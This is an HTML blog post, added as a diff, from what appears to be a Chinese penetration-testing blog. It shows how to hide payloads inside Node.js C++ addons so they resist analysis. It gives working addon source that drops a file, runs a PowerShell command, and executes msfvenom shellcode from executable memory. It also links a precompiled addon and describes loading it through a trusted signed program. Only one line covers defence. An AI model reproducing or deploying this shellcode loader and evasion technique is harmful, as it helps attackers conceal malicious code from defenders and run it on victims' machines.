@@ -1,0 +1,349 @@
+<article class="post">
+  <h1>渗透测试中的Node.js——利用C++插件隐藏真实代码</h1>
+
+  <div class="entry">
+    <h2 id="0x00-前言">0x00 前言</h2>
+<hr>
+
+<p>在之前的文章<a href="https://3gstudent.github.io/3gstudent.github.io/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%AD%E7%9A%84Node.js-Downloader%E7%9A%84%E5%AE%9E%E7%8E%B0/">《渗透测试中的Node.js——Downloader的实现》</a>开源了一个使用Node.js实现Downloader的代码，简要分析在渗透测试中的利用思路。</p>
+
+<p>Node.js的语法简单易懂，所以Node.js代码也很容易被分析。</p>
+
+<p>为了增加Node.js代码被分析的难度，我的思路是利用Node.js的一个功能，将payload以C++插件的形式进行封装。</p>
+
+<p>这样不但能够增加Node.js代码被分析的难度，而且可以用C++代码来实现payload，已有的C++代码经过简单的修改即可使用，减小二次开发的成本。</p>
+
+<h2 id="0x01-简介">0x01 简介</h2>
+<hr>
+
+<p>本文将要介绍以下内容：</p>
+
+<ul>
+  <li>C++插件简介</li>
+  <li>搭建C++插件的开发环境</li>
+  <li>C++插件代码实例</li>
+  <li>利用思路</li>
+  <li>防御建议</li>
+</ul>
+
+<h2 id="0x02-c插件简介">0x02 C++插件简介</h2>
+<hr>
+
+<p>Node.js C++插件是用C++编写的动态链接库，可以使用require()函数加载到Node.js中。利用V8提供的API，可以实现JavaScript和C++的互相调用，打通JavaScript和C++之间的接口。</p>
+
+<p>官方文档：</p>
+
+<p>https://nodejs.org/api/addons.html</p>
+
+<p>使用实例：</p>
+
+<ol>
+  <li>
+    <p>编译成功一个C++插件，导出方法为：hello</p>
+  </li>
+  <li>
+    <p>使用Node.js调用C++插件导出方法的代码如下：</p>
+  </li>
+</ol>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>const addon = require('./addon.node');
+addon.hello();
+</code></pre></div></div>
+
+<ol>
+  <li>执行代码</li>
+</ol>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>node.exe test.js
+</code></pre></div></div>
+
+<h2 id="0x03-搭建c插件的开发环境">0x03 搭建C++插件的开发环境</h2>
+<hr>
+
+<h3 id="1windows开发环境">1、Windows开发环境</h3>
+
+<p>测试系统：Win7sp1 x64</p>
+
+<p>需要安装以下工具：</p>
+
+<ul>
+  <li>.NET Framework 4.5.1或更高版本</li>
+  <li>Python 2.7</li>
+  <li>Visual Studio 2015或更高版本</li>
+</ul>
+
+<p>具体搭建流程如下：</p>
+
+<p>1.安装.NET Framework 4.5.1</p>
+
+<p>https://www.microsoft.com/en-US/download/details.aspx?id=5842</p>
+
+<p>2.下载Node.js</p>
+
+<p>https://nodejs.org/en/download/</p>
+
+<p>3.使用Windows-Build-Tools自动安装依赖工具</p>
+
+<p>https://github.com/felixrieseberg/windows-build-tools</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>cd c:\
+powershell
+npm install --global windows-build-tools
+</code></pre></div></div>
+
+<p>如果安装失败，可选择手动安装以下工具：</p>
+
+<ul>
+  <li>Python 2.7</li>
+  <li>Visual Studio 2015或更高版本</li>
+</ul>
+
+<p>4.安装node-gyp</p>
+
+<p>https://github.com/nodejs/node-gyp</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>npm install -g node-gyp
+</code></pre></div></div>
+
+<h3 id="2linux开发环境">2、Linux开发环境</h3>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>wget https://nodejs.org/dist/v10.15.3/node-v10.15.3-linux-x64.tar.xz
+tar xf node-v10.15.3-linux-x64.tar.xz
+cd node-v10.15.3-linux-x64
+cd bin
+export PATH=/root/node-v10.15.3-linux-x64/bin:$PATH
+./npm install -g node-gyp
+</code></pre></div></div>
+
+<p><strong>注：</strong></p>
+
+<p>需要添加环境变量指定node的位置(<code class="language-plaintext highlighter-rouge">export PATH=/root/node-v10.15.3-linux-x64/bin:$PATH</code>)，否则在执行npm install会失败，提示<code class="language-plaintext highlighter-rouge">/usr/bin/env: ‘node’: No such file or directory</code></p>
+
+<p>实例演示：</p>
+
+<ol>
+  <li>hello.cc:</li>
+</ol>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>#include &lt;node.h&gt;
+namespace demo {
+using v8::FunctionCallbackInfo;
+using v8::Isolate;
+using v8::Local;
+using v8::NewStringType;
+using v8::Object;
+using v8::String;
+using v8::Value;
+
+void Method(const FunctionCallbackInfo&lt;Value&gt;&amp; args) {
+  Isolate* isolate = args.GetIsolate();
+  args.GetReturnValue().Set(String::NewFromUtf8(
+      isolate, "world", NewStringType::kNormal).ToLocalChecked());
+}
+
+void Initialize(Local&lt;Object&gt; exports) {
+  NODE_SET_METHOD(exports, "hello", Method);
+}
+
+NODE_MODULE(NODE_GYP_MODULE_NAME, Initialize)
+
+}  // namespace demo
+</code></pre></div></div>
+
+<ol>
+  <li>binding.gyp</li>
+</ol>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>{
+  "targets": [
+    {
+      "target_name": "addon",
+      "sources": [ "hello.cc" ]
+    }
+  ]
+}
+</code></pre></div></div>
+
+<ol>
+  <li>通过node-gyp编译，生成插件</li>
+</ol>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>node-gyp configure
+node-gyp build
+</code></pre></div></div>
+
+<p><strong>注：</strong></p>
+
+<p>可以合并成一条命令：</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>node-gyp configure build
+</code></pre></div></div>
+
+<p>Node.js支持交叉编译，具体参数说明可参考：</p>
+
+<p>https://www.npmjs.com/package/node-pre-gyp</p>
+
+<p>Linux系统下生成Windows64位系统下使用的插件命令如下：</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>node-gyp configure build --target_arch=x64 --target_platform=win32
+</code></pre></div></div>
+
+<h2 id="0x04-c插件代码实例">0x04 C++插件代码实例</h2>
+<hr>
+
+<p>在开发时，最好避免出现if这种的条件判断语句，直接使用会导致编译错误</p>
+
+<h3 id="1-释放文件">1. 释放文件</h3>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>#include &lt;node.h&gt;
+#include &lt;stdio.h&gt;
+namespace demo {
+	using v8::FunctionCallbackInfo;
+	using v8::Isolate;
+	using v8::Local;
+	using v8::Object;
+	using v8::String;
+	using v8::Value;
+
+	void Method(const FunctionCallbackInfo&lt;Value&gt;&amp; args) {
+		FILE* fp;
+		fopen_s(&amp;fp, "new.txt", "ab+");
+		char *buf = "123456";
+		fwrite(buf, strlen(buf), 1, fp);
+		fseek(fp, 0, SEEK_END);
+		fclose(fp);
+	}
+
+	void init(Local&lt;Object&gt; exports) {
+		NODE_SET_METHOD(exports, "hello", Method);
+	}
+	NODE_MODULE(NODE_GYP_MODULE_NAME, init)
+}
+</code></pre></div></div>
+
+<h3 id="2-执行命令">2. 执行命令：</h3>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>#include &lt;node.h&gt;
+namespace demo {
+	using v8::FunctionCallbackInfo;
+	using v8::Isolate;
+	using v8::Local;
+	using v8::Object;
+	using v8::String;
+	using v8::Value;
+
+	void Method(const FunctionCallbackInfo&lt;Value&gt;&amp; args) {
+		system("powershell start calc.exe");
+	}
+
+	void init(Local&lt;Object&gt; exports) {
+		NODE_SET_METHOD(exports, "hello", Method);
+	}
+	NODE_MODULE(NODE_GYP_MODULE_NAME, init)
+}
+</code></pre></div></div>
+
+<h3 id="3执行shellcode">3.执行shellcode</h3>
+
+<p>生成shellcode：</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>msfvenom -p windows/x64/exec CMD=calc.exe -f c
+</code></pre></div></div>
+
+<p>加载shellcode并执行：</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>#include &lt;node.h&gt;
+#include &lt;Windows.h&gt;
+namespace demo {
+	using v8::FunctionCallbackInfo;
+	using v8::Isolate;
+	using v8::Local;
+	using v8::Object;
+	using v8::String;
+	using v8::Value;
+
+	void Method(const FunctionCallbackInfo&lt;Value&gt;&amp; args) {
+		unsigned char shellcode[] = "\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50\x52"
+			"\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52\x18\x48"
+			"\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9"
+			"\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41"
+			"\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52\x20\x8b\x42\x3c\x48"
+			"\x01\xd0\x8b\x80\x88\x00\x00\x00\x48\x85\xc0\x74\x67\x48\x01"
+			"\xd0\x50\x8b\x48\x18\x44\x8b\x40\x20\x49\x01\xd0\xe3\x56\x48"
+			"\xff\xc9\x41\x8b\x34\x88\x48\x01\xd6\x4d\x31\xc9\x48\x31\xc0"
+			"\xac\x41\xc1\xc9\x0d\x41\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c"
+			"\x24\x08\x45\x39\xd1\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0"
+			"\x66\x41\x8b\x0c\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04"
+			"\x88\x48\x01\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59"
+			"\x41\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48"
+			"\x8b\x12\xe9\x57\xff\xff\xff\x5d\x48\xba\x01\x00\x00\x00\x00"
+			"\x00\x00\x00\x48\x8d\x8d\x01\x01\x00\x00\x41\xba\x31\x8b\x6f"
+			"\x87\xff\xd5\xbb\xf0\xb5\xa2\x56\x41\xba\xa6\x95\xbd\x9d\xff"
+			"\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0\x75\x05\xbb"
+			"\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff\xd5\x63\x61\x6c"
+			"\x63\x2e\x65\x78\x65\x00";
+		void *sc = VirtualAlloc(0, sizeof(shellcode), MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
+		memcpy(sc, shellcode, sizeof(shellcode));
+		(*(int(*)()) sc)();
+
+	}
+
+	void init(Local&lt;Object&gt; exports) {
+		NODE_SET_METHOD(exports, "hello", Method);
+	}
+	NODE_MODULE(NODE_GYP_MODULE_NAME, init)
+}
+</code></pre></div></div>
+
+<p>编译好的插件已上传至github，地址如下：</p>
+
+<p>https://github.com/3gstudent/test/raw/master/addon.node</p>
+
+<p>以上插件代码的导出方法均为<code class="language-plaintext highlighter-rouge">hello</code>，调用方式如下：</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>const addon = require('./addon.node');
+addon.hello();
+</code></pre></div></div>
+
+<h2 id="0x05-利用思路">0x05 利用思路</h2>
+<hr>
+
+<p>1、被第三方可信程序加载</p>
+
+<p>参考：</p>
+
+<p>https://bbs.pediy.com/thread-249573.htm</p>
+
+<p><code class="language-plaintext highlighter-rouge">t.exe</code>-&gt;<code class="language-plaintext highlighter-rouge">node.exe</code>-&gt;<code class="language-plaintext highlighter-rouge">main.js</code></p>
+
+<p>main.js与addon.node放在同级目录，main.js的内容如下：</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>const addon = require('./addon.node');
+addon.hello();
+</code></pre></div></div>
+
+<p>addon.node的格式为dll文件，无法直接获得payload，增加静态分析的成本</p>
+
+<h2 id="0x06-防御建议">0x06 防御建议</h2>
+<hr>
+
+<p>对t.exe的子进程(node.exe)行为进行判断，如果有可疑行为进行拦截，取消对该证书的信任</p>
+
+<h2 id="0x07-小结">0x07 小结</h2>
+<hr>
+
+<p>本文介绍了Node.js中C++插件的用法，可以用来增加Node.js代码被分析的难度，最后分享了三个payload的写法。</p>
+
+<hr>
+
+<p><a href="https://github.com/3gstudent/feedback/issues/new">LEAVE A REPLY</a></p>
+
+
+  </div>
+
+  <div class="date">
+    Written on March  8, 2019
+  </div>
+
+  
+</article>
